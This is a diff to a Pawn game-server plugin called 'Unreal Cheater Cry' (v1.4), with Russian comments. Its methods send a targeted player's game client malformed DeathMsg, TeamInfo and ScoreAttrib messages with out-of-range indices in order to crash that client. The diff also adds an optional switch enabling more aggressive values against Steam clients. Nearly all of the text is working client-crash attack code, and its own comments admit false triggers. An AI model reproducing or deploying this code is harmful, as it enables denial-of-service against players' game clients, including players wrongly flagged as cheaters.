@@ -3,7 +3,7 @@
 #include <reapi>
 
 new const Plugin_sName[] = "Unreal Cheater Cry";
-new const Plugin_sVersion[] = "1.3";
+new const Plugin_sVersion[] = "1.4";
 new const Plugin_sAuthor[] = "Karaulov";
 
 new g_sUserNames[MAX_PLAYERS + 1][33];
@@ -14,6 +14,8 @@ new Float:g_fUserWait[MAX_PLAYERS + 1] = {0.0,...};
 new g_iCrashOffset[MAX_PLAYERS + 1][7];
 
 new g_sCrashSound[64];
+
+//#define UNSAFE_METHODS_FOR_STEAM
 
 // Начало запуска плагина
 public plugin_init()
@@ -95,6 +97,7 @@ public do_crash(idx)
 		// Закомментированные методы вызывают ложные на некоторых протекторах:
 		// !make_cheater_cry_method3(id) &&
 		// !make_cheater_cry_method4(id) &&
+		// вероятно метод 6 вызывает несуществующий звук и приводит к реконнекту, имейте ввиду:)
 		!make_cheater_cry_method6(id) &&
 		!make_cheater_cry_method5(id))
 	{
@@ -169,38 +172,80 @@ public bool:make_cheater_cry_method1(id)
 	if ( deathMsg == 0 )
 		deathMsg = get_user_msgid ( "DeathMsg" );
 
+	new deathMax = 65;
+#if defined(UNSAFE_METHODS_FOR_STEAM)
+	if (is_user_steam(id))
+	{	
+		deathMax = 255;
+	}
+#endif
+
+	if (g_iCrashOffset[id][1] >= deathMax)
+	{
+		return false;
+	}
+
 	for(new i = 0; i <= 5; i++)
 	{
-		if (g_iCrashOffset[id][1] == 65)
+		if (g_iCrashOffset[id][1] >= 65)
+		{
+			if (deathMax == 255)
+			{
+				g_iCrashOffset[id][1] = 1000;
+				message_begin( MSG_ONE, deathMsg, _,id );
+				write_byte( id );
+				write_byte( 255 );
+				write_byte( 0  );
+				write_string( "knife" );
+				message_end();
+
+				message_begin( MSG_ONE, deathMsg, _,id );
+				write_byte( id );
+				write_byte( 124 );
+				write_byte( 0  );
+				write_string( "knife" );
+				message_end();
+
+				message_begin( MSG_ONE, deathMsg, _,id );
+				write_byte( id );
+				write_byte( 125 );
+				write_byte( 1 );
+				write_string( "deagle" );
+				message_end();
+			}
 			return false;
+		}
 
-		message_begin( MSG_ONE, deathMsg, _,id );
-		write_byte( id );
-		write_byte( g_iCrashOffset[id][1] );
-		write_byte( 0  );
-		write_string( "knife" );
-		message_end();
-		
-		message_begin( MSG_ONE, deathMsg, _,id );
-		write_byte( id );
-		write_byte( g_iCrashOffset[id][1] );
-		write_byte( 1 );
-		write_string( "deagle" );
-		message_end();
+		if (g_iCrashOffset[id][1] >= 33)
+		{
+			message_begin( MSG_ONE, deathMsg, _,id );
+			write_byte( id );
+			write_byte( g_iCrashOffset[id][1] );
+			write_byte( 0  );
+			write_string( "knife" );
+			message_end();
+			
+			message_begin( MSG_ONE, deathMsg, _,id );
+			write_byte( id );
+			write_byte( g_iCrashOffset[id][1] );
+			write_byte( 1 );
+			write_string( "deagle" );
+			message_end();
 
-		message_begin( MSG_ONE, deathMsg, _,id );
-		write_byte( id );
-		write_byte( g_iCrashOffset[id][1] );
-		write_byte( 1  );
-		write_string( "knife" );
-		message_end();
+			message_begin( MSG_ONE, deathMsg, _,id );
+			write_byte( id );
+			write_byte( g_iCrashOffset[id][1] );
+			write_byte( 1  );
+			write_string( "knife" );
+			message_end();
 
-		message_begin( MSG_ONE, deathMsg, _,id );
-		write_byte( id );
-		write_byte( g_iCrashOffset[id][1] );
-		write_byte( 0 );
-		write_string( "deagle" );
-		message_end();
+			message_begin( MSG_ONE, deathMsg, _,id );
+			write_byte( id );
+			write_byte( g_iCrashOffset[id][1] );
+			write_byte( 0 );
+			write_string( "deagle" );
+			message_end();
+		}
 
 		g_iCrashOffset[id][1]++;
 	}
@@ -217,16 +262,21 @@ public bool:make_cheater_cry_method2(id)
 	if ( teamInfo == 0 )
 		teamInfo = get_user_msgid ( "TeamInfo" );
 
-	for(new i = 0; i <= 12; i++)
-	{
-		if (g_iCrashOffset[id][2] == 256)
+	if (g_iCrashOffset[id][2] >= 256)
 			return false;
 
-		message_begin( MSG_ONE, teamInfo, _,id );
-		write_byte( g_iCrashOffset[id][2]  );
-		write_string( "CT" );
-		message_end();
-
+	for(new i = 0; i <= 12; i++)
+	{
+		if (g_iCrashOffset[id][2] >= 256)
+			return false;
+		
+		if (g_iCrashOffset[id][2] >= 34)
+		{
+			message_begin( MSG_ONE, teamInfo, _,id );
+			write_byte( g_iCrashOffset[id][2]  );
+			write_string( "KILL_BAD_CHEATERS_KILL_KILL_KILL_KILL_KILL_KILL" );
+			message_end();
+		}
 		g_iCrashOffset[id][2]++;
 	}
 	return true;
@@ -288,22 +338,26 @@ public bool:make_cheater_cry_method5(id)
 	if ( scoreAttrib == 0 )
 		scoreAttrib = get_user_msgid ( "ScoreAttrib" );
 
+	if (g_iCrashOffset[id][5] >= 256)
+			return false;
+
 	for(new i = 0; i <= 12; i++)
 	{
-		if (g_iCrashOffset[id][5] == 256)
+		if (g_iCrashOffset[id][5] >= 256)
 			return false;
+		
+		if (g_iCrashOffset[id][5] >= 33)
+		{
+			message_begin( MSG_ONE, scoreAttrib, _,id );
+			write_byte( g_iCrashOffset[id][5] );
+			write_byte( 0 );
+			message_end();
 
-		message_begin( MSG_ONE, scoreAttrib, _,id );
-		write_byte( g_iCrashOffset[id][5] );
-		write_byte( 0 );
-		message_end();
-
-		if (g_iCrashOffset[id][5] == 256)
-			return false;
-		message_begin( MSG_ONE, scoreAttrib, _,id );
-		write_byte( g_iCrashOffset[id][5] );
-		write_byte( 0xF );
-		message_end();
+			message_begin( MSG_ONE, scoreAttrib, _,id );
+			write_byte( g_iCrashOffset[id][5] );
+			write_byte( 0xF );
+			message_end();
+		}
 
 		g_iCrashOffset[id][5]++;
 	}
